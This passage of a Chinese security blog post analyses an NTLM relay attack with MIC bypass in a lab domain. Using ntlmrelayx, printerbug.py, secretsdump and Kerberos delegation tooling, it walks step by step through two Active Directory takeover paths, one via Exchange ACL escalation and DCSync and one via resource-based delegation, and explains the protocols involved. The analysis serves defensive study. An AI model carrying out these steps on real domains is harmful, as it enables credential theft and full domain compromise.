id=\"攻击方式一：Exchange\"><a href=\"#攻击方式一：Exchange\" class=\"headerlink\" title=\"攻击方式一：Exchange\"></a><strong>攻击方式一：Exchange</strong></h3><p><strong>验证环境：</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>角色</strong></th>\n<th><strong>系统版本</strong></th>\n<th><strong>计算机名</strong></th>\n<th><strong>IP**</strong>地址**</th>\n<th><strong>域</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Attacker</td>\n<td>Ubuntu Server 18.04</td>\n<td>ubuntu</td>\n<td>192.168.123.69</td>\n<td></td>\n</tr>\n<tr>\n<td>DC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec-dc</td>\n<td>192.168.123.150</td>\n<td>test.local</td>\n</tr>\n<tr>\n<td>Exchange</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec</td>\n<td>192.168.123.143</td>\n<td>test.local</td>\n</tr>\n</tbody></table>\n<p><strong>验证过程：</strong></p>\n<p>① 环境搭建</p>\n<ul>\n<li>安装配置域控制器</li>\n<li>安装配置Exchange Server，参考[1]</li>\n<li>在域中新建一个用于测试的账户test</li>\n</ul>\n<p>②执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议。其中–remove-mic选项用于清除MIC标志，–escalate-user用于提升指定用户权限。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDaAU.png\" alt=\"umDaAU.png\"></p>\n<p>③ 执行printerbug.py脚本，触发SpoolService的bug。</p>\n<p><a href=\"https://imgchr.com/i/umDdNF\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDdNF.png\" alt=\"umDdNF.png\"></a></p>\n<p>④ SpoolService的bug导致Exchange服务器回连到ntlmrelayx.py，即将认证信息发送到ntlmrelayx.py。可以在下图中看到认证用户是TEST\\TOPSEC$。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDwh4.png\" alt=\"umDwh4.png\"></p>\n<p>接着ntlmrelayx.py开始执行LDAP攻击，加上-debug选项后可以看到更详细的信息。</p>\n<p>首先，通过遍历验证中继帐户所在用户组及权限，发现当前账户可以创建用户、可以修改test.local域的ACL，因为域中的Exchange Windows Permissions用户组被允许修改ACL，如下图所示：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDB9J.png\" alt=\"umDB9J.png\"></p>\n<p>该用户组下的成员正是中继的计算机账户TOPSEC</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDD39.png\" alt=\"umDD39.png\"></p>\n<p>因此脚本会首选修改ACL来提权，因为这相比创建用户的方式更隐秘一些。具体方式是通过LDAP修改域的安全描述符（Security Descriptor），可以在下面的数据包中看到ACL中每一条具体的访问控制条目（ACE，Access Control Entries）：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDrcR.png\" alt=\"umDrcR.png\"></p>\n<p>⑤ 完成ACL的修改后，test就可以通过secretsdump.py的DCSync功能dump出所有密码哈希值：</p>\n<p><a href=\"https://imgchr.com/i/umDsj1\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDsj1.png\" alt=\"umDsj1.png\"></a></p>\n<h3 id=\"攻击方式二：Kerberos委派\"><a href=\"#攻击方式二：Kerberos委派\" class=\"headerlink\" title=\"攻击方式二：Kerberos委派\"></a>攻击方式二：Kerberos委派</h3><p><strong>验证环境：</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>角色</strong></th>\n<th><strong>系统版本</strong></th>\n<th><strong>计算机名</strong></th>\n<th><strong>IP**</strong>地址**</th>\n<th><strong>域</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Attacker</td>\n<td>Ubuntu Server 18.04</td>\n<td>ubuntu</td>\n<td>192.168.123.69</td>\n<td></td>\n</tr>\n<tr>\n<td>DC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec-dc</td>\n<td>192.168.123.212</td>\n<td>test.local</td>\n</tr>\n<tr>\n<td>SDC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec</td>\n<td>192.168.123.62</td>\n<td>test.local</td>\n</tr>\n</tbody></table>\n<p><strong>验证过程：</strong></p>\n<p>① 环境搭建</p>\n<ul>\n<li>安装配置域控制器，同时开启LDAPS支持，因为该攻击方式需要添加新的计算机账户，必须在LDAPS进行。开启方法参考[2]</li>\n<li>安装配置辅助域控制器，参考[3]</li>\n<li>在域中新建一个用于测试的账户topsec，一个域管理员admin</li>\n</ul>\n<p>② 和攻击方式一相同，执行ntlmrelayx.py本，使用–delegate-access选项，delegate-access选项将中继计算机帐户（这里即辅助域控制器）的访问权限委托给attacker。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umD6nx.png\" alt=\"umD6nx.png\"></p>\n<p>③ attacker对辅助域控制器(SDC)执行printerbug.py脚本</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDcB6.png\" alt=\"umDcB6.png\"></p>\n<p>printerbug.py脚本执行成功后，将触发辅助域控制器(SDC)回连Attacker主机，回连使用的认证用户是辅助域控制器(SDC)本地计算机账户TEST/TOPSEC$。</p>\n<p>ntlmrelayx.py通过ldaps将该用户账户中继到域控服务器(DC)，因为这种攻击方式下所冒用的身份TEST/TOPSEC$并不在Exchange  Windows Permissions组内，不具有修改ACL权限，但是可以通过此身份在DC上添加一个新计算机账户（下图中EJETBTTB$）,  并修改其约束委派授权，授予它对受害计算机（辅助域控制器）的委派权限。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDgHK.png\" alt=\"umDgHK.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDWND.png\" alt=\"umDWND.png\"></p>\n<p>④使用getSP.py脚本，通过-impersonate参数模拟用户admin请求其票证，保存为ccache，admin用户为Domain Admins组的成员，具有对辅助域控制器(SDC)的管理与访问权限。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDf4e.png\" alt=\"umDf4e.png\"></p>\n<p>⑤ 使用上一步骤中保存的Kerberos服务票证，我们可以在目标主机(SDC)上模拟admin身份，从而执行任何操作，例如使用secretsdump转储哈希值。通过secretsdump dump出所有密码哈希值：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umD49H.png\" alt=\"umD49H.png\"></p>\n<h2 id=\"0x02-漏洞细节\"><a href=\"#0x02-漏洞细节\" class=\"headerlink\" title=\"0x02 漏洞细节\"></a><strong>0x02 漏洞细节</strong></h2><hr>\n<p>此次的攻击流程有如下两个方式：</p>\n<p>1、Exchange攻击流程：使用任何AD帐户，通过SMB连接到目标Exchange服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，为攻击者帐户授予DCSync权限。攻击者帐户使用DCSync转储AD中的所有密码哈希值。</p>\n<p>2、Kerberos委派攻击流程：使用任何AD帐户，通过SMB连接到目标服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，将目标服务器的基于资源的约束委派权限授予攻击者控制下的计算机帐户。攻击者作为受害者服务器上的任何用户进行身份验证。</p>\n<h3 id=\"Exchange攻击流程\"><a href=\"#Exchange攻击流程\" class=\"headerlink\" title=\"Exchange攻击流程\"></a>Exchange攻击流程</h3><p>下文出现的攻击流量图中,个角色与ip对应关系同上文<strong>验证环境</strong>搭建：</p>\n<table>\n<thead>\n<tr>\n<th><strong>角色</strong></th>\n<th><strong>系统版本</strong></th>\n<th><strong>计算机名</strong></th>\n<th><strong>IP地址</strong></th>\n<th><strong>域</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Attacker</td>\n<td>Ubuntu Server 18.04</td>\n<td>ubuntu</td>\n<td>192.168.123.69</td>\n<td></td>\n</tr>\n<tr>\n<td>DC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec-dc</td>\n<td>192.168.123.150</td>\n<td>test.local</td>\n</tr>\n<tr>\n<td>Exchange</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec</td>\n<td>192.168.123.143</td>\n<td>test.local</td>\n</tr>\n</tbody></table>\n<p>下文标题内容，即为攻击流程，对应流程图中红框所示的流程</p>\n<p>如果对SMB协议不是很清楚的读者，可以先参考<strong>技术点分析-客户端与服务器端的SMB通信</strong>一节内容</p>\n<h4 id=\"attacker使用普通AD账户登陆Exchange\"><a href=\"#attacker使用普通AD账户登陆Exchange\" class=\"headerlink\" title=\"attacker使用普通AD账户登陆Exchange\"></a>attacker使用普通AD账户登陆Exchange</h4><p>在攻击的开始阶段，attacker需要确保拥有一个可使用的AD账号，这是满足触发SpoolService错误的必要条件。</p>\n<p>首先attacker利用已拥有的AD账号，连接到远程服务器的打印服务（spoolsv.exe）。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDIgA.png\" alt=\"umDIgA.png\"></p>\n<p>Attacker通过SMB2协议登陆Exchange流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDojI.png\" alt=\"umDojI.png\"></p>\n<p>Attacker通过SMB2协议登陆Exchange流量</p>\n<p>成功的通过该阶段，就可以请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。</p>\n<h4 id=\"触发SpoolService错误\"><a href=\"#触发SpoolService错误\" class=\"headerlink\" title=\"触发SpoolService错误\"></a>触发SpoolService错误</h4><p>attacker通过Printerbug脚本，触发Exchange服务器SpoolService错误，强制Exchange服务器通过MS-RPRN RPC接口向attacker进行身份验证。具体细节见技术点分析一章中的SpoolService/printerbug</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umD7ut.png\" alt=\"umD7ut.png\"></p>\n<p>Attacker发送SpoolService错误payload流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDHDP.png\" alt=\"umDHDP.png\"></p>\n<p>Attacker通过printerbug向Exchange发送带有payload的流量</p>\n<h4 id=\"Exchange主机向Attacker发送Negotiate-Protocol-Request\"><a href=\"#Exchange主机向Attacker发送Negotiate-Protocol-Request\" class=\"headerlink\" title=\"Exchange主机向Attacker发送Negotiate Protocol Request\"></a>Exchange主机向Attacker发送Negotiate Protocol Request</h4><p>在触发SpoolService错误后，Exchange服务器向Attacker进行身份验证</p>\n<p>Exchange服务器向Attacker发送NegotiateProtocol Request，这是客户端向服务器发送第一个SMB请求，可参考技术点分析-客户端与服务器端的SMB通信</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDbHf.png\" alt=\"umDbHf.png\"></p>\n<p>Exchange向Attacker发送SMB协商请求流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDLE8.png\" alt=\"umDLE8.png\"></p>\n<p>Exchange向Attacker发送SMB协商请求流量</p>\n<p>在正常的业务场景中，用户想登陆并使用Exchange，往往需要向Exchange服务器发送SMB协商请求流量，以便验证身份并登陆。但由于SpoolService错误，在这里，Exchange向Attacker发送SMB协商请求流量，以便验证身份。这便造成了Attacker可以作为中间人身份中继此身份认证以冒充Exchange欺骗DC的机会。</p>\n<h4 id=\"Attacker将协商请求通过ldap中继到DC服务器\"><a href=\"#Attacker将协商请求通过ldap中继到DC服务器\" class=\"headerlink\" title=\"Attacker将协商请求通过ldap中继到DC服务器\"></a>Attacker将协商请求通过ldap中继到DC服务器</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDOUS.png\" alt=\"umDOUS.png\"></p>\n<p>Attacker向DC中继Exchange的协商请求流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDX4g.png\" alt=\"umDX4g.png\"></p>\n<p>Attacker向DC中继Exchange的协商请求流量</p>\n<p>Attacker作为中间人，将Negotiate ProtocolRequest通过ldap请求中继到ad服务器</p>\n<p>在此步骤以及以下攻击流程中，有需要将SMB身份验证通过LDAP中继至DC的环节。由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，因此需要对流量进行修改，而需改流量，势必需要绕过MIC验证，此处便是本次漏洞的重点，详情见 技术点分析-MIC校验绕过部分</p>\n<h4 id=\"attacker向Exchange发送Negotiate-Protocol-Response\"><a href=\"#attacker向Exchange发送Negotiate-Protocol-Response\" class=\"headerlink\" title=\"attacker向Exchange发送Negotiate Protocol Response\"></a>attacker向Exchange发送Negotiate Protocol Response</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDvCQ.png\" alt=\"umDvCQ.png\"></p>\n<p>Attacker向Exchange发送Negotiate Protocol Response流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDx3j.png\" alt=\"umDx3j.png\"></p>\n<p>Attacker向Exchange发送Negotiate Protocol Response流量</p>\n<h4 id=\"Exchange向attacker发送Session-Setup-Request\"><a href=\"#Exchange向attacker发送Session-Setup-Request\" class=\"headerlink\" title=\"Exchange向attacker发送Session Setup Request\"></a>Exchange向attacker发送Session Setup Request</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDzgs.png\" alt=\"umDzgs.png\"></p>\n<p>Exchange向attacker发送Session Setup Request流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDx3j.png\" alt=\"umDx3j.png\"></p>\n<p>Exchange向attacker发送Session Setup Request流量</p>\n<h4 id=\"Attacker向DC中继Session-Setup-Request\"><a href=\"#Attacker向DC中继Session-Setup-Request\" class=\"headerlink\" title=\"Attacker向DC中继Session Setup Request\"></a>Attacker向DC中继Session Setup Request</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umrSvn.png\" alt=\"umrSvn.png\"></p>\n<p>Attacker向DC中继Session Setup Request流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umr9uq.png\" alt=\"umr9uq.png\"></p>\n<p>Attacker向DC中继Session Setup Request流量</p>\n<p>Attacker将Exchange发送来的Session Setup Request 中继给DC， DC将包含 CHALLENGE的Response发送给Attacker</p>\n<h4 id=\"Attacker-向exchange发送Session-Setup-Response（CHALLENGE）\"><a href=\"#Attacker-向exchange发送Session-Setup-Response（CHALLENGE）\" class=\"headerlink\" title=\"Attacker 向exchange发送Session Setup Response（CHALLENGE）\"></a>Attacker 向exchange发送Session Setup Response（CHALLENGE）</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umrCD0.png\" alt=\"umrCD0.png\"></p>\n<p>Attacker 向exchange发送Session Setup Response流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umrPbV.png\" alt=\"umrPbV.png\"></p>\n<p>Attacker 向exchange发送Session Setup Response流量</p>\n<p>Attacker 将DC发出的包含challenge的Session Setup Response发送给exchange</p>\n<h4 id=\"exchange向Attacker发送包含了身份验证请求的Session-Setup\"><a href=\"#exchange向Attacker发送包含了身份验证请求的Session-Setup\" class=\"headerlink\" title=\"exchange向Attacker发送包含了身份验证请求的Session Setup\"></a>exchange向Attacker发送包含了身份验证请求的Session Setup</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umrFET.png\" alt=\"umrFET.png\"></p>\n<p>exchange向Attacker发送包含了身份验证请求的Session Setup Request流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umrPbV.png\" alt=\"umrPbV.png\"></p>\n<p>exchange向Attacker发送包含了身份验证请求的Session Setup流量</p>\n<p>我们可以看到上图中的认证用户为TEST\\TOPSEC$，而不是运行Exchange的SYSTEM账户，这是因为SYSTEM账户具有太高权限，如果用此帐户对网络资源进行身份验证，则会出现安全问题。所以当访问网络资源时，使用本地计算机的网络帐户对网络进行身份验，（形式为domain\\computername$，即TEST\\TOPSEC$）</p>\n<p>Exchange收到challenge后，向attacker发送包含了身份验证请求的Session Setup流量</p>\n<h4 id=\"Attacker向-DC中继含有Exchange的身份认证的Session-Setup-Request\"><a href=\"#Attacker向-DC中继含有Exchange的身份认证的Session-Setup-Request\" class=\"headerlink\" title=\"Attacker向 DC中继含有Exchange的身份认证的Session Setup Request\"></a>Attacker向 DC中继含有Exchange的身份认证的Session Setup Request</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umyB9g.png\" alt=\"umyB9g.png\"></p>\n<p>Attacker向 DC中继Session Setup Request流程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umrkUU.png\" alt=\"umrkUU.png\"></p>\n<p>Attacker向 DC中继Session Setup Request流量</p>\n<p>DC认证通过Exchange身份，并向Attcker发送认证通过的Response。</p>\n<p>此时，DC对Attacker的身份验证结束，Attacker成功冒用Exchange身份。由于安装Exchange后，Exchange在Active  Directory域中具有高权限，Exchange的本地计算机账户TOPSEC$会被加入用户组Exchange Trusted  Subsystem，该用户组又隶属于Exchange Windows Permissions。ExchangeWindows Permissions组可以通过WriteDacl方式访问Active Directory中的Domain对象，该对象允许该组的任何成员修改域权限，从而可以修改当前域ACL达到提权目的。</p>\n<p>使用提权后的用户或计算机可以执行域控制器通常用于复制的同步操作，这允许攻击者同步ActiveDirectory中用户的所有哈希密码。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umre29.png\" alt=\"umre29.png\"></p>\n<p>同步Active Directory中用户的所有哈希密码</p>\n<h3 id=\"Kerberos委派攻击流程\"><a href=\"#Kerberos委派攻击流程\" class=\"headerlink\" title=\"Kerberos委派攻击流程\"></a>Kerberos委派攻击流程</h3><p>下文出现的攻击流量图中,个角色与ip对应关系同上文<strong>验证环境</strong>搭建：</p>\n<table>\n<thead>\n<tr>\n<th>角色</th>\n<th>系统版本</th>\n<th>计算机名</th>\n<th>IP地址</th>\n<th>域</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Attacker</td>\n<td>Ubuntu Server 18.04</td>\n<td>ubuntu</td>\n<td>192.168.123.69</td>\n<td></td>\n</tr>\n<tr>\n<td>DC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec-dc</td>\n<td>192.168.123.212</td>\n<td>test.local</td>\n</tr>\n<tr>\n<td>SDC</td>\n<td>Windows Server 2012 R2</td>\n<td>topsec</td>\n<td>192.168.123.62</td>\n<td>test.local</td>\n</tr>\n</tbody></table>\n<p>Kerberos委派攻击流程与Exchange攻击利用，在DC对Attacker的身份验证结束之前的阶段是类似的。区别在于后续提权过程，下面介绍下Kerberos委派攻击后续攻击流程。</p>\n<p>在attacker冒用SDC身份后，由于SDC计算机身份没有修改访问控制列表(ACL)的权限，无法直接提权。而后续提权利用中的S4U2Self不适用于没有SPN的帐户。在域环境中，任何域用户都可以通过MachineAccountQuota创建新的计算机帐户，并为其设置SPN。Attacker通过此方式新建一个域中的计算机账号。这一过程通过LDAP实现并设置账户与密码，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/um5ZGt.png\" alt=\"um5ZGt.png\"></p>\n<p>Ntlmrelayx工具成功创建计算机账户</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/um46KS.png\" alt=\"um46KS.png\"></p>\n<p>DC上可见computers列表中新创建的名为EJETBTTB的计算机</p>\n<p>在域中新的计算机账户EJETBTTB(下图中的service A)建立成功后，后续攻击如下图攻击步骤</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umrmvR.png\" alt=\"umrmvR.png\"></p>\n<p>攻击步骤</p>\n<h4 id=\"攻击者为Service-A配置了基于资源的约束委派\"><a href=\"#攻击者为Service-A配置了基于资源的约束委派\" class=\"headerlink\" title=\"攻击者为Service A配置了基于资源的约束委派\"></a>攻击者为Service A配置了基于资源的约束委派</h4><p>由于通过S4U2Self请求到的TGSforwardable标志位为 Non-forwardable,这意味着该TGS服务票据是不可转发的，不可以在接下来的S4U2Proxy中进行转发。但是不可转发的TGS竟然可以用于基于资源的约束委派，S4U2Proxy会接收这张不可转发的TGS。由于我们拥有Service A的计算机账号以及密码，所以在这里可以为Service A到SDC配置了基于资源的约束委派，将默认的约束委派更改为基于资源的约束委派，以便后续攻击。</p>\n<h4 id=\"Service-A-调用S4U2Self向认证服务器-SDC-为admin请求访问自身的服务票据\"><a href=\"#Service-A-调用S4U2Self向认证服务器-SDC-为admin请求访问自身的服务票据\" class=\"headerlink\" title=\"Service A 调用S4U2Self向认证服务器(SDC)为admin请求访问自身的服务票据.\"></a>Service A 调用S4U2Self向认证服务器(SDC)为admin请求访问自身的服务票据.</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umIVw4.png\" alt=\"umIVw4.png\"></p>\n<p>通过国外安全研究员Elad  Shami的研究可知，无论服务账号的UserAccountControl属性是否被设为TrustedToAuthForDelegation，  服务自身都可以调用S4U2Self为任意用户请求访问自己的服务票据，也就是说，这里Service A  可以调用S4U2Self向SDC为admin用户申请可访问自身的服务票据.</p>\n<h4 id=\"SDC将为admin用户申请的访问ServiceA的TGS发送给Service-A\"><a href=\"#SDC将为admin用户申请的访问ServiceA的TGS发送给Service-A\" class=\"headerlink\" title=\"SDC将为admin用户申请的访问ServiceA的TGS发送给Service A\"></a>SDC将为admin用户申请的访问ServiceA的TGS发送给Service A</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umsnJg.png\" alt=\"umsnJg.png\"></p>\n<h4 id=\"Service-A通过S4U2Proxy-转发TGS，并为admin申请访问SDC票据\"><a href=\"#Service-A通过S4U2Proxy-转发TGS，并为admin申请访问SDC票据\" class=\"headerlink\" title=\"Service A通过S4U2Proxy 转发TGS，并为admin申请访问SDC票据\"></a>Service A通过S4U2Proxy 转发TGS，并为admin申请访问SDC票据</h4><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umsuWQ.png\" alt=\"umsuWQ.png\"></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h4 id=\"SDC将为admin用户申请的访问SDC的TGS发送给Service-A\"><a href=\"#SDC将为admin用户申请的访问SDC的TGS发送给Service-A\" class=\"headerlink\" title=\"SDC将为admin用户申请的访问SDC的TGS发送给Service A\"></a>SDC将为admin用户申请的访问SDC的TGS发送给Service A</h4><p>在这里，Service A为Attacker创建并控制，Attacker获得TGS票据，利用该票据以admin身份访问SDC，完成提权</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umslyn.png\" alt=\"umslyn.png\"></p>\n<h2 id=\"0x03技术点分析\"><a href=\"#0x03技术点分析\" class=\"headerlink\" title=\"0x03技术点分析\"></a><strong>0x03技术点分析</strong></h2><hr>\n<p>在理清利用流程后，接下来详解利用流程中的技术点</p>\n<h3 id=\"客户端与服务器端的SMB通信\"><a href=\"#客户端与服务器端的SMB通信\" class=\"headerlink\" title=\"客户端与服务器端的SMB通信\"></a>客户端与服务器端的SMB通信</h3><p>补充介绍一些关于SMB通信协议相关内容，通过这部分内容，可以加深对的漏洞流程的理解。对SMB通信协议熟悉的读者，可以跳过此部分</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umD53d.png\" alt=\"umD53d.png\"></p>\n<p>客户端与服务器端的SMB通信流程</p>\n<h3 id=\"SMB2-Negotiate-Protocol\"><a href=\"#SMB2-Negotiate-Protocol\" class=\"headerlink\" title=\"SMB2 / Negotiate Protocol\"></a><strong>SMB2 / Negotiate Protocol</strong></h3><p>Negotiate Protocol是在SMB2的任何新TCP会话上发出的第一个SMB2命令，它用于协商要使用的协议版本。</p>\n<p>Negotiate Protocol命令分为如下两部分：</p>\n<ol>\n<li>Negotiate Protocol Request：客户端向服务器发送第一个SMB请求：“Negotiate ProtocolRequest”。这个请求包含了客户端所支持的各种 SMB Dialect。</li>\n<li>Negotiate Protocol Response: 服务器收到该请求后，选择一个它支持的最新版本（比如NTLM 0.12），再通过“Negotiate Protocol Response”回复给客户端。</li>\n</ol>\n<p><strong>SMB2 / Session Setup</strong></p>\n<p>SMB2 / Session Setup命令用于对用户进行身份验证并获取分配的UserID。此命令通常是SMB2 / Negotiate Protocol阶段完成后从客户端发出的第一个命令。</p>\n<p>Session Setup分为如下两部分：</p>\n<p>1.Session SetupRequest: Negotiate Protocol阶段结束之后，，客户端请求和服务器建立一个session，在客户端发送的Session Setup Request里，包含了身份验证请求。</p>\n<p>\\2. Session SetupResponse: 服务器回复是否通过验证。</p>\n<h3 id=\"SpoolService-printer-bug\"><a href=\"#SpoolService-printer-bug\" class=\"headerlink\" title=\"SpoolService/printer bug\"></a>SpoolService/printer bug</h3><p>在攻击利用流程中，需要使用到一个名为printerbug.py的工具，此工具触发SpoolService/printer bug，强制Windows主机通过MS-RPRN RPC接口向攻击者进行身份验证。</p>\n<p>Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。</p>\n<p>任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umsKzj.png\" alt=\"umsKzj.png\"></p>\n<p>在本次漏洞的利用过程中，我们通过printerbug.py脚本触发了上述bug，强制Exchange服务器对攻击者（192.168.123.69）发起身份验证，而Exchange默认是以SYSTEM身份执行的。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDifH.png\" alt=\"umDifH.png\"></p>\n<p>下图是printerbug.py执行后的数据包：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDkpd.png\" alt=\"umDkpd.png\"></p>\n<p>1、第一次身份验证由攻击者向exchange服务器发起，以便可以远程连接到Spoolsv服务，可以看到使用的账号是一个普通的域成员账号test；</p>\n<p>2、接着，printerbug.py脚本中调用RpcRemoteFindFirstPrinterChangeNotificationEx()，请求对一个新的打印作业进行更新，并令其将该通知发送给我们指定的attackerhost（192.168.123.69）。这部分数据就是上图中Encrypted SMB3中的一部分。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umsbtS.png\" alt=\"umsbtS.png\"></p>\n<p>3、第二次身份验证便是使Exchange向attackerhost（192.168.123.69）发起的身份验证，用户为TEST\\TOPSEC$，（不是SYSTEM的原因是：如果本地服务使用SYSTEM帐户访问网络资源，则使用本地计算机的网络帐户domain\\computername$对网络进行身份验证）</p>\n<h3 id=\"SMB中继LDAP思路以及难点\"><a href=\"#SMB中继LDAP思路以及难点\" class=\"headerlink\" title=\"SMB中继LDAP思路以及难点\"></a>SMB中继LDAP思路以及难点</h3><p>在攻击利用流程中，需要将SMB身份验证通过LDAP中继至DC，由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，将SMB流量通过LDAP中继难点以及绕过思路如下：</p>\n<p>1、默认情况下，SMB中的NTLM身份验证:NEGOTIATE_SIGN为set状态</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDE6I.png\" alt=\"umDE6I.png\"></p>\n<p>2、将此SMB流量中继到LDAP时，由于此时的NegotiateSign设置为set，该标志会触发LDAP签名，而此SMB流量为Attacker从Exchange服务器上中继而来，无法通过LDAP的签名校验，从而被LDAP忽略，导致攻击失败</p>\n<p>3、为了防止攻击失败，需要将NEGOTIATE_SIGN设置为Not set</p>\n<p>4、MIC保护不被篡改，如果简单的改包，将NEGOTIATE_SIGN设置Not set，将会导致MIC校验不通过</p>\n<p>5、需要寻找一种可以绕过MIC校验的方式，以便更改包中的值</p>\n<p>6、在绕过MIC校验之后，更改NEGOTIATE_SIGN值为Not set，使得在不触发LDAP签名校验的情况下，将SMB中继LDAP</p>\n<h3 id=\"MIC校验\"><a href=\"#MIC校验\" class=\"headerlink\" title=\"MIC校验\"></a>MIC校验</h3><p>NTLM身份验证由3种消息类型组成：</p>\n<p>NTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE。</p>\n<p>NTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE对应位于SMB协议中的SessionSetup阶段</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umDVXt.png\" 